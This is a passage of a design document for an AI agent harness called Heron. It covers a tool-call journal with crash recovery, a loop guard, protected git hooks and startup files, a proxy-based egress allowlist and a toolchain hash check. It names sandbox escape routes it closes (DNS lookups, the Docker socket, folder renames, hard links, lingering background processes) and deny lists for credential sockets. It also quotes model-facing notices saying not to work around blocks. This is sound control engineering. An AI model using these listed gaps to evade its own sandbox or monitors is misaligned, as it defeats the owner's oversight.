| `started_at`, `finished_at` | Unix seconds |
| `proc` | The id of the writing process: a UUID made once per process |
| `session_id`, `run_id`, `origin` | Which conversation, which run ([the run frame](#the-run-frame)), and what Heron was doing (the session's `Origin`, or the approval's origin) |
| `workspace` | The working folder the call ran in |
| `kind` | `tool` or `action` |
| `name` | The tool name, or the action's handler name (for example `selfheal.repair`) |
| `label` | For an action, the text shown to the user (for example `Repair #12`). NULL for a tool |
| `args` | The full arguments JSON (tool), or the subject (action). Set to NULL once the row is `done`, `failed`, `cancelled` or `asked` |
| `args_hash` | SHA-256 of the canonical (key-sorted) arguments. It stays after `args` is cleared |
| `summary`, `risk`, `tainted` | As shown in an approval |
| `state` | See below |
| `outcome` | A redacted preview of up to 300 characters, as the audit log keeps |
| `approval_id` | The approval that asks again, once one exists |

**States.**

```text
intent ──▶ done | failed | cancelled                       (the call ended in this process)
intent ──▶ interrupted ──▶ asked ──▶ rerun | dismissed     (the process died first)
```

*   `done`: the tool returned. A shell command with a non-zero exit code is `done`; its result says so.
*   `failed`: the tool returned an error, timed out or panicked.
*   `cancelled`: the run was stopped by the user before the tool returned. No ask-again is made.
*   `asked`: an approval exists. `rerun` and `dismissed` are set when the user answers it.

**Why the full arguments.** The owner listed an args hash. A re-run needs the arguments themselves, so the row keeps them only while the call is open (OQ7 (a)). The `approvals` table already keeps the same data for every parked request. The file tools are refused `heron.db`, and it matches a secret pattern in the sandbox.

**Retention.** `Store::maintain` deletes rows in `done`, `failed`, `cancelled`, `rerun` or `dismissed` that are older than 30 days (OQ12). Rows in `intent`, `interrupted` or `asked` are kept.

##### The run frame

A run's id and its protect snapshot live in a `RunFrame`, held in a tokio task-local (`agent::RUN`), not on `Agent` or `ToolCtx`. `run_turn(&self)` can't set a field on the agent (`src/agent.rs:468`), and this leaves every `ToolCtx` construction unchanged.

*   **Who sets it:**
    *   **A chat turn.** `run_turn` at depth 0 sets one when none is set: `turn:<id>`, with the id from `crate::events::new_run_id()`.
    *   **Jobs and automations.** `run_job` and `run_automation` set `job:<job_runs.id>` when the scheduler made a `job_runs` row (`run_due_schedules`, `src/app.rs:1498-1500`). "Run now" (`src/app.rs:1703`) and triggers (`src/app.rs:1755`) make no such row, so they set `job:<job id>:<new_run_id()>`. A `run_turn` inside a job finds the frame set and keeps it.
    *   **An approval carried out later.** `run_parked` sets `parked:<approval id>`. After #77 it runs on its own task, so it sets its frame inside that task.
*   **Why every call sees it.** A task-local is visible to everything awaited inside its scope: `delegate`'s child `run_turn`, the `join_all` of read-only calls, and `Agent::call_tool` from automations. None of these spawns a task.
*   **Outside any frame.** Code with no frame, such as a test that calls `execute_call` directly, records `run_id = "none"` and gets no rehash.
*   **At the end.** `agent::in_run(frame, fut)` sets the frame, awaits the work, and then runs the protect comparison ([§3.3](#33-the-after-run-rehash)). Its drop guard covers a cancel or a panic by handing the comparison to `spawn_blocking`.

#### 1.3 One helper on both execution paths

`journal::guarded(store, heron_home, intent, limit, fut) -> Result<String>` does five things:

1.  It takes this process's lease for `heron_home` if it doesn't hold one yet ([§1.4](#14-recovery-and-telling-a-live-process-from-a-dead-one)).
2.  It inserts the intent row and commits it.
3.  It awaits `tokio::time::timeout(limit, fut)`. The tool timeout moves inside `guarded`.
4.  It writes the outcome: `Ok(text)` becomes `done`; `Err` becomes `failed`; a timeout becomes `failed` with "timed out after Ns".
5.  A drop guard covers a future dropped before step 4. `Store` calls are synchronous, so it can write from `Drop`.
    *   **A cancel.** `POST /api/cancel` aborts the run's task (`src/server.rs:645-653`). The guard writes `cancelled`. The user stopped the run, so no ask-again is made.
    *   **A panic.** When `std::thread::panicking()` is true, the guard writes `failed` with "the tool panicked". After #76, a panic ends the run.

Two callers use it:

*   `execute_call`, around `tool.call`, replacing its own timeout (`src/agent.rs:685-689`). This also covers automations, because `Agent::call_tool` goes through `execute_call`.
*   `run_parked`, around its direct `tool.call`, replacing its own timeout (`src/app.rs:1804`).

On durability, the intent is its own committed transaction before the tool starts. The rusqlite bundled SQLite defaults to `synchronous=FULL`, also in WAL mode, so a process crash never loses it. A power loss can, because macOS `fsync` is not `F_FULLFSYNC`. That case is accepted and is in the [Risks](#risks-and-mitigations) table. The cost is two small commits per mutating call.

#### 1.4 Recovery, and telling a live process from a dead one

Several Heron processes can share one `heron.db`: the app's core, `heron chat` in a terminal, and `heron run`. Recovery runs only in the process that holds `background.lock` (`own_background_work`, `src/app.rs:2099-2117`), but even that process must never mark another live process's intent as interrupted.

*   **The lease.** Each process makes one UUID, its `proc`. Before its first intent insert in a Heron home, it creates `<heron home>/journal/<proc>.lock` and holds an exclusive lock on it for its whole life (`File::try_lock`, as `background.lock` already does). A process-wide map, keyed by Heron home, holds the open file. The operating system drops the lock when the process dies, whatever the cause.
*   **Recovery.** `journal::recover(store, heron_home) -> Result<usize>` runs in two passes.
    1.  **Mark.** For each distinct `proc` with `intent` rows, other than this process: if its lease file is missing, or this process can lock it, that process has exited. One transaction in `with_conn` moves its rows to `interrupted`. Then the lease file is removed.
    2.  **Ask.** For every `interrupted` row with no `approval_id`, and outside `with_conn`, it calls `ask_again`. That calls `park_approval`, or `reopen_approval` for a parked call ([§1.5](#15-the-ask-again-hook-the-interface-pre-5-names)). Then it calls `set_asked(id, approval_id)`, which also clears `args`.

    Pass 2 is idempotent. A crash between `park_approval` and `set_asked` leaves the row `interrupted`, and the next pass gets the same approval back, because `park_approval` merges an identical waiting request (`src/store.rs:1061-1064`). So no `interrupted` row is left without an approval.
*   **When it runs.**
    *   At the existing recovery point in `own_background_work` (`src/app.rs:2113-2114`), before `recover_interrupted_approvals`.
    *   On each `scheduler_loop` tick, inside `if self.own_background_work()` (`src/app.rs:2134`). After #78, `observer_tick` uses the same gate. A crashed terminal session is surfaced within one 20-second tick, not at the next app start.
*   **One rule for `with_conn`.** A `with_conn` closure never calls a `Store` method. `Store` holds a `std::sync::Mutex`, which is not re-entrant (`src/store.rs:1059-1060`), so such a call would deadlock.
*   **One path per action, so the user is told once.**
    *   A row whose run is `parked:<id>` gets no new approval. Its original approval goes back from `running` to `new`, with the ask-again summary (`reopen_approval`). `recover_interrupted_approvals` then no longer finds it `running`, and leaves it alone.
    *   A parked approval that was claimed but never reached `journal::guarded` keeps today's `unknown` path. Then nothing ran.
    *   Why not reuse `approvals.running` for this: `recover_interrupted_approvals` has no liveness test (`src/store.rs:1100-1105`), and `run_parked` runs in whichever process serves the API (`src/server.rs:1177`). A call still running in another process would be marked unknown, or asked again while it runs. The lease tells the two cases apart.
*   **What the model sees after a restart.** `repair_transcript` fills a missing tool result with a fixed text (`src/agent.rs:287`). The text changes to: "[interrupted: Heron stopped before this tool returned. It may have finished. If it changes something, the user has an approval asking whether to run it again. Don't run it again yourself.]" With OQ9's default, an identical call in that session also asks while that approval waits.

#### 1.5 The ask-again hook (the interface Pre-5 names)

*   **Tool entries** reuse parked approvals unchanged:
    *   `park_approval(session_id, tool, args, summary, detail, risk, tainted, origin)`, where:
        *   `summary` = `"<tool summary> was interrupted. Run again?"`. The shell's summary is the command, so CUJ 1 reads "`git commit -m …` was interrupted. Run again?";
        *   `detail` = "Heron stopped while doing this. It may or may not have finished. Check before running it again.";
        *   `origin` = `"interrupted: <origin>"`.
    *   **Run again** → `POST /api/approvals/{id}` `approve` → `run_parked`. It already re-checks the current policy and the call's taint. That includes taint that reached the conversation later, for `shell` and the folder walks `search_files` and `find_files` (`src/app.rs:1788-1795`). It also refuses, with status `blocked`, when the row's `workspace` differs from the current working folder: "This ran in <path>, and Heron is now working in <path>."
    *   **Dismiss** → `dismiss` (below).
*   **Action entries** are for other modules. This is what Harness2 calls:

    ```text
    journal::register_resumer(handler: &'static str, resumer: Arc<dyn Resumer>)   // a process-wide registry in src/journal/
    journal::begin_action(store, heron_home, ActionIntent) -> Result<EntryId>       // EntryId = the effects row id (i64)
    journal::finish(store, id: EntryId, Outcome::Done | Outcome::Failed(String))

    struct ActionIntent { handler: &'static str, subject: String, label: String,
                          session_id: String, origin: String, tainted: bool, workspace: PathBuf }

    #[async_trait]
    trait Resumer: Send + Sync {
        async fn rerun(&self, app: &App, subject: &str, tainted: bool) -> Result<String>;   // Run again
        fn declined(&self, app: &App, subject: &str);                                      // Dismiss
    }
    ```

    *   **On recovery,** an interrupted action becomes `park_approval(session_id, "resume:<handler>", {"subject": …}, "<label> was interrupted. Run again?", detail, "exec", tainted, "interrupted: <origin>")`.
    *   **Run again on a `resume:` name.** `run_parked` keeps every check a tool gets, in this order:
        1.  `risk_notice::check` and `claim_approval`, as today, so two clicks never re-run it twice.
        2.  **The taint:** `parked.tainted`, or the session's current taint. `resume:` names join `sees_conversation_grants`, so taint that reached the conversation after the action started also counts.
        3.  **The policy.** Every `resume:` entry has the fixed effect `ProcessExec`, which matches its `"exec"` risk. `run_parked` builds a `Call` for it and runs `policy.decide`. A Deny sets status `blocked`, so read-only mode and the current rules apply.
        4.  **The resumer.** Only now is it looked up, in place of the tool registry. A handler that no build has registered gets status `failed`, with "This Heron can't resume this kind of action."
        5.  **The call.** `rerun(app, subject, tainted)` runs inside `journal::guarded`, with run `parked:<id>`. `Ok(text)` sets `approved`, and `Err` sets `failed`.
    *   **A resumer that does tool work** makes each call through `Agent::call_tool`, with a `ToolCtx` whose `tainted` is the value it was given. Each call then gets the permission gate, the taint rule and the memory rule (I2, I4). Harness2's resumer only re-queues a trigger, so it makes no tool calls.
    *   **Dismiss is a claim.** `Store::dismiss_approval(id) -> bool` runs `UPDATE approvals SET status='dismissed' WHERE id=? AND status='new'`, as `claim_approval` does for approve (`src/store.rs:1094-1096`). Today's dismiss has no status filter (`src/server.rs:1183-1186`, `src/store.rs:1111-1114`). Only a won claim calls `declined` for a `resume:` name, so a stale Dismiss after **Run again** does nothing. After #77, the approve branch runs `run_parked` on its own task, and the dismiss branch stays inline.
    *   No model-visible tool can be named `resume:…`. Tool names are fixed in the registry, and `run_parked` checks the prefix before the registry lookup.
*   **What Harness2 does with it.** It records the action in the **main** `heron.db`, from the main process, before it spawns `heron-cli selfheal repair --run <id>`. `tainted` is the trigger's `origin_tainted`, and `session_id` is the trigger's session. The repair process uses its own disposable `HERON_HOME`, so its tool calls journal into that home's database, which is thrown away. The run-level row is what survives.
    *   **Run again:** `rerun` re-queues the trigger. If the repair child is somehow still running, Harness2 must check for it.
    *   **Dismiss:** `declined` sets `triggers.state = cancelled`.
    *   **While waiting:** Harness2 shows `interrupted`, which its own state list already has.
    *   The label is `"Repair #<id>"`, so the text is exactly "Repair #12 was interrupted. Run again?".
    *   The toolchain and protect checks around the child are in [§3.4](#34-the-toolchain-hash-check-the-interface-pre-5-names) and [file 14](#14-documents-modify-w7).

### 2. U2, the loop guard

*   **The port.** `src/repeat/mod.rs` is anchor-harness `crates/harness-core/src/repeats.rs` (204 lines, at `daed7ef`), ported with five of its six tests. `state_survives_serialization` is left out: it tests anchor's stored format, and Heron's guard lives for one turn. Each fingerprint is the SHA-256 of `[tool, canonical input, ok, output]`, where a failed call's output has every run of digits replaced by `#`.
    *   `observe(limit, tool, input, ok, output) -> Option<Stop>` returns a stop when the last `period × limit` calls are one block of `period` calls (1 to 3) repeated. `Stop` holds `period`, the block's tool names, and whether digits were masked.
    *   `same_call_count()` returns how many calls with the same name and arguments end the history, whatever their results. This is exactly today's `recent_calls` count (`src/agent.rs:559-560`).
    *   The port uses `sha2` and `serde_json`'s key ordering directly. `serde_json` is built without `preserve_order`, so `Value` keys serialize sorted. Heron's one SHA-256 helper is private (`content_hash`, `src/tools/fs.rs:63`). Pre-S1 moves it to `crate::util::sha256_hex`, which the journal, protect, toolchain and repeat modules all use.
*   **It replaces `recent_calls`.** `recent_calls` (`src/agent.rs:488`, `558-566`) is replaced, not joined, by one `RepeatGuard` per `run_turn` call. Sub-agents get their own, because they run their own `run_turn`.
    *   **The nudge stays:** when `same_call_count() >= 3`, which is today's threshold of a third identical call, the same text is appended. The test `untrusted_output_is_wrapped_and_repeats_are_flagged` (`src/agent.rs:1361`) keeps passing unchanged.
    *   **The stop is new:** when `observe` returns a stop, Heron finishes recording that batch's tool results and sends `Event::Notice(<text>)`. Then it leaves the step loop for the existing closing call with no tools (`src/agent.rs:573-584`). The step-limit notice is replaced by: "[system notice] You were stopped. <text> Without calling any tools, tell the user what you tried, what is blocking you, and what they could do."
    *   **The text.** For a block of one call: "Stopped: the same call (<tool>) ran <limit> times in a row with the same results." For two or three: "Stopped: the same <N> calls (<tool>, <tool>) ran <limit> times in a row with the same results." When digits were masked, it adds: "Failures that differ only in digits count as the same."
    *   **A stopped sub-agent.** The child's sink drops notices (`src/agent.rs:729-734`). Its closing text returns as the `delegate` result, so the parent model still learns why it stopped.
*   **`ok`.** `execute_call` returns text only. A result is a failure when any of these hold:
    *   it starts with `Error:` or `Permission denied`, the convention `call_tool` already uses (`src/agent.rs:590-597`). After #75, an error from a tool with outside output is wrapped as untrusted, and it still starts with `Error:`;
    *   for `shell`, it has a line `[exit code N]` with N not 0 (`src/tools/shell.rs:124-134`), or it starts with `[timed out after` (`src/tools/shell.rs:107`). A failing shell command returns `Ok` text, so without this rule CUJ 4 could never fire.

    This stays a string rule. A structured result from `execute_call` would change `call_tool`, `delegate` and the concurrent path.
*   **Digits are ignored only in failures** (OQ7 (c)). A success whose numbers change ("3 passed", then "4 passed", a growing file size) is progress. A failure whose only change is a timing or a process id is the same failure.
*   **The limit.** `agent.max_repeats` (`u32`), default 4. 0 turns the stop off, and the nudge stays (OQ7 (d)). 1 is refused, in config validation and in `apply_settings`, because it would stop a turn at its first call.

### 3. U3, protected paths, egress and the toolchain

#### 3.1 The protected list and the write check

`src/protect/` is anchor-harness `crates/harness-runtime/src/protect.rs` (at `daed7ef`), ported whole with its tests. That brings:

*   the bounded scan, with its limit and `truncated` flag;
*   `is_write_protected`, `apply`, `regex_escape`, and snapshots;
*   `changes`, with its rules for new repositories: git's sample hooks, `NEW_REPO_CONFIG_KEYS`, and anchor's allowed `branch.*` and `remote.*` keys, so an ordinary `git clone` is not reported as a change.

The list is compiled constants. Like the Refused list, configuration can't open it. The rest of this section says only where Heron differs from anchor.

*   **The list:**
    *   **Names at any depth of the working folder:** anchor's `WORKSPACE_NAMES`. These are `.envrc`, `.mcp.json`, `.gitmodules`, `.ripgreprc`, the shell rc files, `.claude`, `.vscode`, `.idea` and `.husky` (OD5; OQ10 for `.claude`).
    *   **Git:** anchor's `GIT_PARTS`, for each repository the scan finds: `<gitdir>/hooks/**` and `<gitdir>/config`. When `.git` is a file (a worktree or a submodule), Heron follows its `gitdir:` line and protects `<commondir>/hooks/**`, `<commondir>/config` and `<gitdir>/config.worktree`.
    *   **Paths in the user's home (new in Heron):**
        *   the shell rc files and `Library/LaunchAgents/` (OD5);
        *   OQ3's additions: `.gitconfig`, `.config/git/`, `.cargo/config.toml` and `.zlogin`.
    *   **Heron's homes (new in Heron):** `config.toml`, `heron.db`, `heron.db-wal`, `heron.db-shm` and `secrets.json`, in both `cfg.home` and the default `~/.heron` (OQ3).
        *   Only `cfg.home` is in the file tools' Refused roots today (`ReadRoots::build`, `src/permissions.rs:949`). So the default home's files are newly protected when `HERON_HOME` points elsewhere.
        *   The folders themselves are not protected, so Harness2's `~/.heron/selfheal/runs/` stays writable.
*   **Labels.** `is_protected(path, workspace, user_home, heron_homes) -> Option<&'static str>` returns the category the user sees, one per part of the list:
    *   "a git hook";
    *   "a repository's git config";
    *   "a shell startup file";
    *   "a launch agent";
    *   "an editor or agent settings folder";
    *   "a git or cargo settings file";
    *   "Heron's own settings or data".

**The file tools.** `classify_path(path, workspace, cfg, write = true)` returns `Refused` when `protect::is_protected` matches. This happens before the existing workspace and outside-write cases, and for every form of the path: as given, canonical, and the data-volume alias.

*   **Any `.git` component.** As anchor does (`protect.rs:117-125`), a write path with a `.git` component is also refused. That closes writing hooks into a plain folder and then pointing a `.git` file at it, and it covers `.git/modules/<name>/hooks`.
*   **The result.** `write_file`, `edit_file` and every other writing file tool are refused in every mode, and no rule or approval opens them. Reads are unchanged.
*   **The message.** "Refused: <path> is a protected file (<label>, which runs code later). Heron's file tools can't change it in any mode." It reaches the deny message as `Call::refusal` ([file 9](#9-srcpermissionsrs-modify-w6a)). `Effect` carries no payload, and `decide` writes the Refused text itself (`src/permissions.rs:384`).

**The shell sandbox.** `protect::seatbelt_rules(workspace, user_home, heron_homes, &scan, writable) -> (String, Vec<PathBuf>)` returns the rules, and the paths to pass to `refused_ancestors`. `seatbelt_profile`'s `Shell` branch adds them right after the writable allowance (`src/sandbox.rs:387-388`), before the existing Refused and secret denies. Those denies then still win over the one allow below:

*   **Workspace names:** a `(deny file-write* (regex …))` for each name at any depth under the working folder, written as `^<ws>/(.*/)?\.envrc$` or `^<ws>/(.*/)?\.vscode(/.*)?$`. `<ws>` goes through the ported `regex_escape`, so a `+`, `(` or `"` in the path can't change the rule. The rules are case-insensitive through `seatbelt_regex`.
*   **Hooks at any depth, with no scan needed:** a deny for `^<ws>/(.*/)?\.git/(.*/)?hooks(/.*)?$`, then an allow for `^<ws>/(.*/)?\.git/(.*/)?hooks/[^/]+\.sample$` only. Seatbelt applies the last rule that matches. The allow is limited to that prefix, so it re-opens nothing outside a hooks folder. This also covers repositories made during the run, and `.git/modules/*/hooks`. PT-P2 checks that `git init` and `git clone` still work.
*   **Repository config:** `(deny file-write* (literal …))` for each scanned repository's config files.
*   **Home paths and Heron's homes:** only those inside a writable folder. The rest are already outside the writable set (`src/sandbox.rs:385-388`), so rules for them would add nothing.
*   **Renaming a parent:** `refused_ancestors(protected, writable)` (`src/sandbox.rs:255`), reused unchanged. A command then can't rename a parent folder, write under the new name and rename it back. The cost: a folder that holds a repository can't be renamed or deleted from the sandbox.

**The scan.** It is anchor's bounded scan. It skips `node_modules`, `target`, `.venv`, `venv` and `__pycache__`, and stops after 100,000 entries.

*   **Per command.** The shell scans once per command, with no cache, so a repository made by one command is denied in the next.
*   **The limit.** When the scan stops at its limit, the command's output gets "[protect] This folder has more than 100,000 entries. Repositories past that point are checked only after the run." The rehash then reports the cut-off as a change.

**What protected paths break.** The model sees Seatbelt's "Operation not permitted" with the existing sandbox hint (`sandbox::DENIED_HINT`), or the file tools' refusal above. In each case it should ask the user to do the step.

*   `git remote add`, `git push -u`, `git branch -u`, `git config` and `git submodule init` all write `.git/config`, so they fail in the sandbox.
*   husky's `prepare` script writes `.husky/` and the hooks path, so `npm install` fails in a repository that uses husky.
*   Edits to `.vscode/`, `.claude/`, `.envrc` and `.mcp.json` are refused, by the file tools and by the shell.
*   "Add this alias to my .zshrc" is refused. The user edits the file.
*   A folder that holds a repository can't be renamed or deleted from the sandbox.

#### 3.2 The egress allowlist

**The mechanism chosen: a local CONNECT proxy for each command, with Seatbelt allowing only loopback.**

Seatbelt's `network-outbound` filter accepts only `localhost` or `*` as the host. It can't name `static.crates.io`, and a fixed IP list would break every time a CDN rotates its addresses. So a host-level rule can only be applied by something that sees the host name, which means a proxy. Seatbelt's job is to make the proxy the only way out. anchor-harness already runs this design and tests it (`crates/harness-runtime/src/proxy.rs`, 792 lines, at `daed7ef`). Heron ports it rather than writing a new one.

*   **The proxy.** `src/egress/` ports anchor-harness's `proxy.rs`. It listens on `127.0.0.1:0`, inside the Heron process and outside the sandbox. It accepts only `CONNECT host:443` and refuses everything else, plain-HTTP requests included. It allows a tunnel only when all three of these hold:
    1.  `host_allowed(allowlist, host)`, where an entry is an exact name or `*.suffix`;
    2.  the host resolves to a public address, so an allowed name that points at loopback, the LAN or `169.254.169.254` is refused;
    3.  the TLS ClientHello's server name equals the CONNECT host.

    It never decrypts TLS. It records every decision.
*   **It fails closed.** If the proxy can't start, the command does not run: "Heron couldn't start its network filter, so this command was not run."
*   **Its lifetime.** One proxy is started for each shell command and dropped when the command returns, so each command's blocked hosts can be appended to that command's own output. A background process that outlives its command loses that proxy. It can still reach a later command's proxy, because `localhost:*` is open (OQ4), so the allowlist still applies to it.
*   **The Seatbelt rules.** They are added to the `Shell` profile only, after #79's local-socket rules (`local_sockets`, which allows only the resolver, the system log, and sockets in the working folder and the shell's own `TMPDIR`):
    *   deny outbound IP connections: `(deny network-outbound (remote ip "*:*"))`. Bind and inbound stay allowed, unlike anchor-harness's `(deny network*)`. Unix sockets stay under #79's rules, and PT-E1 checks that they do;
    *   allow outbound to `localhost:*` (OQ4);
    *   deny `localhost:<p>` for Heron's own API ports (below) and for each port in `agent.deny_local_ports`;
    *   deny the DNS resolver `/private/var/run/mDNSResponder`, which #79 allows. This deny comes after #79's rule, so names can't be looked up and lookups can't carry data out;
    *   deny anchor's `default_deny_sockets` (Docker, Podman, OrbStack, Colima, Lima, Rancher Desktop, `.gnupg`, 1Password and `SSH_AUTH_SOCK`) and the launchd SSH agent sockets. After #79 these are already unreachable unless they sit inside the working folder or `TMPDIR`. These denies cover that case.

    The Docker or OrbStack socket is outside the working folder, so #79 already denies it. That closes "ask the Docker daemon to fetch it".
*   **Heron's own API ports.** The deny list holds `cfg.server.port` and every port a server in this process has bound. A process-wide set in `server.rs` is filled in `start_endpoint` (`src/server.rs:249-264`). A server in another process that fell back to a random port (`src/server.rs:250-258`) is not covered. I3 doesn't rest on this deny: every `/api` route needs the token (`src/server.rs:124-137`), and the token is never written where the sandbox can read it. It is held in memory, handed to the app over the core's stdout (`endpoint_line`, `src/server.rs:268-269`), or printed as a launch URL.
*   **The environment.** After `env_allowed` (`src/tools/shell.rs:64-69`), the shell sets `HTTPS_PROXY`, `HTTP_PROXY`, `ALL_PROXY` and their lower-case forms to `http://127.0.0.1:<port>`. It sets `NO_PROXY` and `no_proxy` to `localhost,127.0.0.1,::1`. These replace any proxy variables the user's environment had. #79's `TMPDIR` setting is unchanged.
*   **The settings** (`[agent]` in `config.toml`, and `/api/settings`):
    *   `egress` (`String`): `"allowlist"` (default) or `"open"`. Anything else is refused.
    *   `egress_allow` (`Vec<String>`), default `DEFAULT_ALLOW`. A list the owner sets replaces the default, and the Settings screen starts from the default list. Each entry is an exact host name, or `*.` followed by at least two labels. An IP address, a port, a URL or an empty entry is refused with "Not a host name: <entry>."
    *   `deny_local_ports` (`Vec<u16>`), default empty. Port 0 is refused.

    With `open`, today's profile applies: no IP rules and no proxy, while #79's socket rules stay. Only the owner can set these, through the settings API, because the agent can't write `config.toml`.
*   **The default list** (OQ12). These hosts are read-mostly. PT-E2 must confirm they are enough.
    *   **Rust:** `index.crates.io`, `static.crates.io`, `static.rust-lang.org`
    *   **GitHub:** `github.com`, `codeload.github.com`, `objects.githubusercontent.com`, `release-assets.githubusercontent.com`
    *   **Python:** `pypi.org`, `files.pythonhosted.org`
    *   **Node:** `registry.npmjs.org`
*   **Blocked-host lines, one per reason.** Each is appended to the command's output:
    *   **not on the list:** "[network] blocked <host>:<port>: not on the sandbox's egress allowlist. Don't work around this; tell the user, who can add the host in Settings › Sandbox."
    *   **not a public address:** "[network] blocked <host>:<port>: it resolves to a private or local address, which the sandbox never reaches."
    *   **server name mismatch:** "[network] blocked <host>:<port>: the TLS connection named a different server (<name>)."
    *   **not a CONNECT to 443:** "[network] blocked <request>: the sandbox allows only HTTPS on port 443, through its proxy."

    A program that ignores the proxy variables gets a connection error and no line.
*   **What breaks.** This is proposed as accepted (OQ7 (f)). The threat model and `docs/cli-providers.md` must say so.
    *   **Hosts not on the list.** Any shell command that reaches one fails. Examples: `curl` to an arbitrary site, `brew install`, `go get`, `git clone` from GitLab or Bitbucket, and `cargo search`, since `crates.io` is off the list. The model is told to use `web_fetch` for pages, which goes through the permission gate and taint.
    *   **Plain HTTP, any port other than 443, and SSH.** `git@github.com:` remotes and `git push` over SSH stop working, and so does `ssh` itself.
    *   **Programs that ignore the proxy variables.** Examples are `ping`, `nc` to remote hosts, and some language runtimes with proxy support turned off. They fail closed.
    *   **DNS from inside the sandbox.** `nslookup`, `dig` and code that resolves names before it connects all fail.
    *   **Docker and OrbStack** from Heron's shell.
    *   **Background processes started by a command** lose that command's proxy when it ends.
    *   **Linux and Windows:** nothing changes (G8).

#### 3.3 The after-run rehash

*   **The snapshot.** `protect::Snapshot::take(workspace, user_home, heron_homes) -> Snapshot` runs at the run's first mutating call, and the snapshot is kept in the `RunFrame` ([§1.2](#the-run-frame)). So read-only runs pay nothing. It records SHA-256, or "missing", for:
    *   each protected file;
    *   each file in a protected folder;
    *   each repository's hooks and config.

    It also records whether the scan hit its limit. It leaves out `heron.db*`, the `journal/` lease files and `background.lock`, which Heron itself writes on every call (OQ8).
*   **The comparison.** At the end of the frame, `in_run` takes a fresh snapshot on a blocking thread, then calls `before.diff(&after) -> Vec<ProtectedChange>`, which is anchor's `changes`. These are reported:
    *   a change to a protected file (`changed`), a new one (`new`) and a deleted one (`deleted`);
    *   a new repository whose hooks are not git's samples, or whose config has keys outside the allowed ones (`new repository`);
    *   a scan that hit its limit.
*   **What a report does:**
    *   it sends `Event::Notice` to the run's sink, when the run ended normally: "Protected files changed while Heron was working: <path> (<kind>), … If you didn't change them, check them before you next use this folder.";
    *   it adds `store.add_inbox("Protected files changed", <paths>)`;
    *   it writes `store.audit(session, "protect", <paths>, "protected-path-changed", "")`.

    The report names the paths only, never their contents.
*   **It is a detector.** The run is not stopped or rolled back. Seatbelt and `classify_path` are the controls.
    *   **What it catches:** what they can't. That covers a hard link (PT-P1), a background process still running when the run ends, and a gap in either rule.
    *   **What it can't see:** a change made between runs, because each run compares only against its own snapshot. A baseline kept across runs would blame the owner's own edits on Heron.
*   **Harness2's repair child.** The main process takes a `Snapshot` of the repair worktree before it spawns the child, and diffs it after the child exits. Any report goes to the main inbox (file 14).

#### 3.4 The toolchain hash check (the interface Pre-5 names)

Under OQ1's stronger option this whole section is dropped.

*   **The manifest.**
    *   For each folder `~/.rustup/toolchains/<name>/`, the manifest covers every regular file except those under `lib/rustlib/src/` and `share/doc/`. That includes `bin/`, `lib/` and `libexec/`. rust-analyzer runs `libexec/rust-analyzer-proc-macro-srv` unsandboxed, and both toolchains on the owner's Mac have it. That is about 150 files and 600 MB per toolchain.
    *   `~/.cargo/bin/` is left out (OQ12). The sandbox can't write there, and including it would make every `cargo install` the owner runs trip a refusal.
    *   For each file it records the path, size, mtime and SHA-256. On unix it also records the inode and ctime (`std::os::unix::fs::MetadataExt`).
    *   `~/.cargo/registry` is not covered (OQ2).
*   **Platforms.** The check runs wherever a shell sandbox is active: macOS, and Linux with bubblewrap. Windows runs no sandboxed commands, so there `check` returns `Trusted`, and the stat code is `#[cfg(unix)]` (G8).
*   **The baseline.** It is stored as JSON in kv `toolchain:baseline`, in the main `heron.db`.
    *   **Made by:** the first `check` in a build that has this feature, by trust on first use (OQ12). After that, it is changed only by `toolchain::trust_current`, and by the stat refresh below.
    *   **Who can call `trust_current`:** only the authenticated API, `POST /api/toolchain/trust`. The app's Settings › Sandbox calls it. The sandbox can't reach `heron.db`, and no tool calls `trust_current`. So, as with a "never" lift, the agent can't re-trust (OQ6).
    *   **Cost:** the first baseline hashes about 1.2 GB for two toolchains, on a blocking thread. That is estimated at under a second at the `sha2` crate's speed on Apple silicon; Pre-S2 measures it.
*   **The check.** `toolchain::check(store, user_home) -> ToolchainState` stats every manifest path, and every current file under the same roots, which shows new toolchains and new files. Only a file whose stat data differs from the baseline is hashed again.
    *   **When the hash still matches** (a `touch`), the stored stat data for that file is refreshed. That is the only baseline write besides `trust_current`.
    *   **Why stat first is sound:** a process that isn't root can't set ctime, and replacing a file changes its inode. Checking about 300 paths is estimated at well under a millisecond.
    *   **The result:**

        ```text
        enum ToolchainState {
            Trusted,
            NoBaseline,                                   // the first check makes one; no refusal, no denies
            Changed { toolchains: Vec<String>, files: Vec<ChangedFile>, since: i64, during: Option<String> },
        }
        ```
    *   **Transitions:** `NoBaseline` becomes `Trusted` at the first check. `Trusted` becomes `Changed` when a hash differs, or a file or toolchain appears or disappears. `Changed` becomes `Trusted` only through `trust_current`.
*   **The notice.** kv `toolchain:changed` records the change once: its toolchains, files, `since`, `during` and whether it was reported.
    *   The first check that finds `Changed` with no record writes one, and posts the notice and an inbox entry. So a change is reported once, whatever made it: a command that was killed or timed out, a background process, or the owner's own `rustup update`.
    *   `during` names the command when the check before that command found `Trusted`. Otherwise the notice says "changed since Heron last checked".
*   **When it runs, in the shell tool:**
    1.  **Before each command.** If the state is `Changed` and the command line names a Rust tool, Heron refuses: "Heron won't run the Rust toolchain: <toolchain> changed since you last trusted it (<files>). Check it, then trust it in Settings › Sandbox." This is the message the model and the user read.
    2.  **The profile.** While the state is `Changed`, `seatbelt_profile` adds `(deny file-read* (subpath ~/.rustup/toolchains/<name>))` for each changed toolchain. This is what enforces "uses" (OD7, OQ7 (h)) for any route, not only for command lines that name cargo.
    3.  **After each command,** the timeout path included (the early return at `src/tools/shell.rs:94-108`), it checks again. When this check posted the notice, it appends "[toolchain] the Rust toolchain <name> changed during this command (<files>). Heron won't use it until you trust it in Settings › Sandbox."
*   **What "names a Rust tool" means.**
    *   The command is split into parts at `|`, `||`, `&&`, `;`, `&`, newlines, `$(`, backticks and `(`.
    *   In each part, Heron skips leading `VAR=value` words. It also skips the wrappers `env` (with its flags and assignments), `command`, `exec`, `time`, `nice`, `nohup`, `xargs` (with its flags) and `sudo`.
    *   It takes the base name of the next word. That is a Rust tool when it is `cargo`, `rustc`, `rustup`, `rustdoc`, `rustfmt`, `clippy-driver` or `rust-analyzer`, or starts with `cargo-`.
    *   Anything else, such as an `sh -c` string or a script, is left to the Seatbelt deny. Its failure carries the existing sandbox hint.
*   **After the owner's own `rustup update`,** the next Heron cargo command is refused with the same message. Once the owner trusts the toolchain, it works again. This costs one click about every six weeks.
*   **What Harness2 calls.**
